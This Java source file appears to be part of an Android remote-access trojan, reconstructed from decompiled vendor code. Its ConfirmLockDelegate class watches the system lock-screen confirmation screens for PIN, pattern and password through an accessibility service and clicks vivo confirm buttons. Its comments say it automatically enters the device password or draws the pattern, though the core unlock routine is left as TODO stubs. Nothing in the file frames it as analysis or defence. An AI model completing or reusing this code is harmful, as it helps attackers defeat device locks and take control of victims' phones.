package com.vendor.rat.auto.engine;

import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.service.MyAccessibilityService;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 锁屏密码验证代理
 *
 * Vendor: o/i.java (266 行)
 * 功能: 监听锁屏密码验证界面 (PIN/图案/密码)
 *       自动输入密码或绘制图案完成验证
 *       支持 vivo 特殊 PIN 确认
 *
 * 字段对齐:
 *   f647n → settingsPackage (String, "com.android.settings")
 *   f648o → processedActions (ConcurrentLinkedQueue)
 *
 * 方法对齐:
 *   I(str)  → isLockScreen(str)
 *   L()     → createListenWindows()
 *   O()     → isVivoOrOppo()
 *   P()     → sleepHalf()
 *   H()     → waitForUnlock()
 *   J()     → clickVivoConfirm()
 *   K(req)  → unlockDevice(req) [反编译失败]
 *   M(node) → pressEnter(node)
 *   N(pts)  → resolveGesture(pts)
 *   d()     → destroy()
 *   equals/hashCode
 *   u()     → onAccessibilityEvent()
 */
public class ConfirmLockDelegate extends AutoEngine {

    private static final String TAG = "ConfirmLockDelegate";

    private static final String SETTINGS = "com.android.settings";

    // ADAPT: f647n → settingsPackage
    public final String settingsPackage;

    // ADAPT: f648o → processedActions
    public final ConcurrentLinkedQueue<String> processedActions;

    public ConfirmLockDelegate() {
        super(createListenWindows(), SETTINGS);
        this.settingsPackage = SETTINGS;
        this.processedActions = new ConcurrentLinkedQueue<>();
    }

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute，由 onAccessibilityEvent 驱动
    }

    @Override
    public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
        // ADAPT: vendor u() 中检查 isLockScreen 后触发解锁
        if (isLockScreen(className)) {
            Log.d(TAG, "已进入锁屏密码验证代理");
            if (!processedActions.contains("inConfirmLock")) {
                processedActions.add("inConfirmLock");
                // ADAPT: com.guard.wallet.thread.l.c(new a(this, 1), this.c)
                // TODO: VENDOR_VERIFY - 需要集成解锁逻辑
            }
        }
    }

    /**
     * 判断是否为锁屏验证界面
     * ADAPT: I(str) → isLockScreen
     */
    public static boolean isLockScreen(String className) {
        if (className == null || className.isEmpty()) {
            // ADAPT: vendor 检查 MyAccessibilityService.f224v.get()
            return false;
        }
        return Objects.equals(className, "com.android.settings.password.ConfirmLockPassword")
                || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern")
                || Objects.equals(className, "com.android.settings.password.ChooseLockGeneric")
                || Objects.equals(className, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
                || Objects.equals(className, "com.android.settings.password.ConfirmLockPattern$InternalActivity");
        // ADAPT: vendor 还检查 SoftInputWindow + password() 条件，此处省略
    }

    /**
     * 创建监听窗口列表
     * ADAPT: L() → createListenWindows
     */
    public static List<WindowMatcher> createListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPassword")
                .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPattern")
                .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ChooseLockGeneric")
                .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
                .addEventType(32).addEventType(16384));
        list.add(new WindowMatcher(SETTINGS, "com.android.settings.password.ConfirmLockPattern$InternalActivity")
                .addEventType(32).addEventType(16384));
        return list;
    }

    /**
     * 等待解锁完成
     * ADAPT: H() → waitForUnlock
     * 轮询最多 20 次，每次 100ms
     */
    public final boolean waitForUnlock() {
        AtomicInteger counter = new AtomicInteger(0);
        while (counter.incrementAndGet() < 20 && isLockScreen(null)) {
            try {
                Thread.sleep(100L);
            } catch (Exception e) {
                Log.e(TAG, "waitForUnlock interrupted", e);
            }
        }
        return !isLockScreen(null);
    }

    /**
     * 点击 vivo 确认按钮
     * ADAPT: J() → clickVivoConfirm
     * 尝试多种确认按钮 ID
     */
    public final void clickVivoConfirm() {
        UiNode root = getRootNode();
        if (root == null) return;

        String pkg = this.settingsPackage;
        String[][] buttons = {
            {"android.view.View", pkg + ":id/mix_confirm"},
            {"android.widget.TextView", pkg + ":id/iv_complete"},
            {"android.widget.Button", pkg + ":id/vivo_pin_confirm"},
            {"android.widget.TextView", pkg + ":id/mix_normal_confirm"}
        };

        for (String[] btn : buttons) {
            CombineFilter filter = CombineFilter.and(
                    StringCondition.className(btn[0]),
                    StringCondition.viewId(btn[1]));
            UiNode node = root.findOneByCombine(filter);
            if (node != null && node.click()) {
                return;
            }
        }
    }

    /**
     * 短暂等待
     * ADAPT: P() → sleepHalf (500ms)
     */
    public static void sleepHalf() {
        try {
            Thread.sleep(500);
        } catch (Exception e) {
            Log.e(TAG, "sleepHalf", e);
        }
    }

    /**
     * 按回车键
     * ADAPT: M(node) → pressEnter
     */
    public final void pressEnter(UiNode uiObject) {
        // ADAPT: vendor 先尝试 ADB "input keyevent 66"
        // TODO: VENDOR_VERIFY - ADB shell 集成
        if (uiObject == null) {
            UiNode root = getRootNode();
            if (root != null) {
                // ADAPT: vendor 调用 currentFocusedNode()
                // TODO: VENDOR_VERIFY
            }
        }
        if (uiObject != null && Build.VERSION.SDK_INT >= 30) {
            // ADAPT: vendor 调用 uiObject.enter()
            // TODO: VENDOR_VERIFY - UiNode.enter() 方法
        }
    }

    // ============ equals/hashCode ============

    @Override
    public boolean equals(Object obj) {
        if (this == obj) return true;
        if (obj != null && (obj instanceof ConfirmLockDelegate)) {
            return Objects.equals(this.settingsPackage, ((ConfirmLockDelegate) obj).settingsPackage);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(ConfirmLockDelegate.class.getName(), this.settingsPackage);
    }
}
